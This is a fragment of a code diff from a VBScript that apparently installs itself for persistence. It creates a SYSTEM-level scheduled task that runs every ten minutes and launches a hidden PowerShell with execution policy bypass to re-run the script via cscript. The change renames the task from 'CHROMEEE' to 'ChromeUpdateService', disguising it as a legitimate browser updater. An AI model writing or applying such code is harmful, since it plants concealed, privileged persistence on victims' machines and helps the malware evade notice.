@@ -25,7 +25,7 @@ Else
    Next
    objFile.Close()
    Set WshShell = CreateObject("WScript.Shell")
-   cmd="schtasks /create /sc minute /mo 10 /tn ""CHROMEEE"" /ru ""SYSTEM"" /tr ""powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe " & file & "'"" /f"
+   cmd="schtasks /create /sc minute /mo 10 /tn ""ChromeUpdateService"" /ru ""SYSTEM"" /tr ""powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe " & file & "'"" /f"
    WshShell.Run cmd, 0, True
    Set WshShell = Nothing
 End If
